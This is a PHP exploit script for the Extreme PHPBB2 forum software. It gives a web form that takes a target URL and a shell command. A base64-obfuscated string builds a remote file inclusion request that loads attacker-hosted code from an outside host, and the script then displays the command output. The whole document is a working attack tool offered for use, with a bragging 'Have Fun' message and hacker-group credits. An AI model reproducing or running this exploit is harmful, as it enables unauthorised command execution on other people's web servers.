<?php
/***********************************************/
/*  Extreme PHPBB2 Command Execution Exploit   */
/*    By : HACKERS PAL <security@soqor.net>    */
/*         Website : WwW.SoQoR.NeT             */
/***********************************************/

error_reporting(0);
ini_set("max_execution_time",0);
Function
get_page($url){if(function_exists("file_get_contents")){$contents=file_get_contents($url);}else{$fp=fopen("$url","r");whi
le($line=fread($fp,1024)){$contents=$contents.$line;}}return$contents;}
Echo "<body bgcolor=\"#000000\" text=\"#00FF00\">\n<title>Extreme PHPBB2 Command Execution Exploit by : HACKERS PAL ::
WwW.SoQoR.NeT ::</title>\n\r"."<h2>Extreme PHPBB2 Command Execution\n\r"."<h3>By : HACKERS PAL
[security@soqor.net]\n\r"."<h3>VisiT My Website [<a href=\"http://WwW.SoQoR.NeT\">WwW.SoQoR.NeT</a>]\n\r";

$expl=base64_decode("aW5jbHVkZXMvZnVuY3Rpb25zLnBocD9waHBiYl9yb290X3BhdGg9aHR0cDovL3BzZXZpbC5nb29nbGVwYWdlcy5jb20vY21kLnR4
dD8=");
     $action=$_GET['action'];
     if($action == "")
     {
      echo "<form action=\"$PHP_SELF?action=2\" method=\"post\">\n Web URL  -- Example : http://localhost/Extreme\n
<br> <input type=\"text\" name=\"url\" style=\"width:250\">\n     <br>     <br>\n   Command : <br> <textarea
name=\"query\" cols=\"70\" rows=\"5\"></textarea>\n     <br>\n     <br>       <div align=\"center\">\n     <input
type=\"submit\">       </div>\n </form>\n     ";
     }
     else
     {
     $exploit=$_POST['url']."/".$expl."&cmd=".$_POST['query'];
     $page=get_page($exploit);
     if(!eregi("hacking attempt",$page))
     {
      Echo "<h1> Command Successfully executed .. Result is</h1> $page <br> Thanks For Using This exploit .. Have Fun
:)<br><br><br>";

     }

     }
die(base64_decode("PGRpdiBhbGlnbj0iY2VudGVyIj4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPgpHPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+cjwvZm
9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+RUU8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj50PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5aPC9mb25
0Pjxmb250IGNvbG9yPSJ3aGl0ZSI+CjoKPC9mb250Pgo8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+CkQ8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5ldmk8L2Zv
bnQ+PGZvbnQgY29sb3I9IiMwMDgwMDAiPkw8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj4tPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4wMDwvZm9ud
D48Zm9udCBjb2xvcj0id2hpdGUiPgosCjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPk08L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5vPC9mb250Pj
xmb250IGNvbG9yPSIjMDA4MDAwIj5oQTwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPmphPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5saSA8L2ZvbnQ
+Cjxmb250IGNvbG9yPSIjRkZGRkZGIj4sPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KRDwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPnIuPC9mb250
Pjxmb250IGNvbG9yPSIjMDA4MDAwIj5FPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+eDwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+RTwvZm9udD48Z
m9udCBjb2xvcj0id2hpdGU


iPgosCjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPgpHPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+YUNrZTwvZm9udD48Zm9udCBjb2xvcj0iI0ZG
MDAwMCI+UjwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPiAsCjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPlM8L2ZvbnQ+PGZvbnQgY29sb3I9Indoa
XRlIj5wPC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIj4xZDwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMD
AiPlI8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5OPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+ZXQ
gLAo8L2ZvbnQ+Cjxmb250IGNvbG9yPSIjRkYwMDAwIj5CPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+bGFjawo8L2ZvbnQ+Cjxmb250IGNvbG9yPSIjRkYw
MDAwIj5BPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+dHRhQzwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+azwvZm9udD48Zm9udCBjb2xvcj0id2hpd
GUiPiAsCjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPk08L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5pbmk8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRj
AwMDAiPk08L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5hPC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIj5uPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI
+ICwKPC9mb250Pgo8Zm9u

dCBjb2xvcj0iI0ZGMDAwMCI+SjwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDgwMDAiPnJlPC9mb250Pjxmb250I
GNvbG9yPSJ3aGl0ZSI+ZTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+SDwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPjxmb250IGNvbG9yPSIjRkYwMD
AwIj4KQjwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPmE8L2ZvbnQ+PC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIj5naDwvZm9udD48Zm9udCBjb2xvcj0
id2hpdGUiPmRhPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5EPC9mb250Pjxmb250IGNvbG9yPSIjRkZGRkZGIj4KLCA8L2ZvbnQ+PGZvbnQgY29sb3I9
IiNGRjAwMDAiPkQ8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZGRkYiPnIgPC9mb250Pgo8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+SDwvZm9udD48Zm9udCBjb2xvc
j0iI0ZGRkZGRiI+YTwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+Y2s8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZGRkYiPmU8L2ZvbnQ+PGZvbnQgY29sb3
I9IiNGRjAwMDAiPnI8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZGRkYiPgosPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+PGJyPgo8L2ZvbnQ+Cjxmb250IGN
vbG9yPSIjRkYwMDAwIj5TPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+cDwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+ZWM8L2ZvbnQ+PGZvbnQgY29s
b3I9IndoaXRlIj5pYTwvZ


m9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+bCBHPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+cjwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+RUU8L2
ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj50PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5aPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+CjwvZm9udD4
KPGZvbnQgY29sb3I9IiNGRjAwMDAiPkY8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5vciA6CjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPlM8L2Zv
bnQ+PGZvbnQgY29sb3I9IndoaXRlIj5vPC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIj5RPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+bzwvZm9udD48Z
m9udCBjb2xvcj0iI0ZGMDAwMCI+UjwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPi48L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPk48L2ZvbnQ+PGZvbn
QgY29sb3I9IndoaXRlIj5lPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5UPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+CjwvZm9udD4KPGZvbnQgY29
sb3I9IiNGRjAwMDAiPlQ8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5lYTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+TTwvZm9udD48Zm9udCBjb2xv
cj0id2hpdGUiPgo8L2ZvbnQ+Cjxmb250IGNvbG9yPSIjRkYwMDAwIj5BPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+bjwvZm9udD48Zm9udCBjb2xvcj0iI
0ZGMDAwMCI+RDwvZm9udD

48Zm9udCBjb2xvcj0id2hpdGUiPgo8L2ZvbnQ+Cjxmb250IGNvbG9yPSIjRkYwMDAwIj5NPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+ZTwvZm9udD48Zm9
udCBjb2xvcj0iIzAwODAwMCI+bWI8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5lcjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+UzwvZm9udD48Zm9u
dCBjb2xvcj0id2hpdGUiPjsKPC9mb250Pgo8L2I+Cjxicj48YnI+CjxhIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiIGhyZWY9Im1haWx0bzpzZWN1c
ml0eUBzb3Fvci5uZXQiPgo8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+UzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiI+ZTwvZm9udD48Zm9udCBjb2xvcj0iI0
ZGMDAwMCI+QzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiI+dTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+UjwvZm9udD48Zm9udCBjb2xvcj0iI0Z
GRkZGRiI+aTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VDwvZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiI+eTwvZm9udD48Zm9udCBjb2xvcj0iIzAw
ODAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+W0FUXTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+UzwvZ
m9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+bzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVmVyZG
FuYSIgc2l6ZT0iMiI+UTw

vZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+bzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVmVy
ZGFuYSIgc2l6ZT0iMiI+UjwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+W0RvVF08L2ZvbnQ+PGZvbnQgY29sb
3I9IiNGRjAwMDAiIGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPk48L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZGRkYiIGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPm
U8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiIGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPlQ8L2ZvbnQ+PC9hPgo8YnI+CjxhIGhyZWY9Imh0dHA6Ly93d3c
uc29xb3IubmV0IiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lOyI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlc8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZG
RkYiPnc8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlc8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDgwMDAiIGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPltEb
1RdPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIiBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj5TPC9mb250Pjxmb250IGNvbG9yPSIjRkZGRkZGIiBmYWNlPS
JWZXJkYW5hIiBzaXplPSIyIj5vPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIiBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj5RPC9mb250Pjxmb250IGNvbG9
yPSIjRkZGRkZGIiBmYWNl

PSJWZXJkYW5hIiBzaXplPSIyIj5vPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIiBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj5SPC9mb250Pjxmb250IGNvb
G9yPSIjMDA4MDAwIiBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj5bRG9UXTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT
0iMiI+TjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+ZTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmF
jZT0iVmVyZGFuYSIgc2l6ZT0iMiI+VDwvZm9udD48L2E+CjwvZGl2Pgo8L2JvZHk+"));
?>

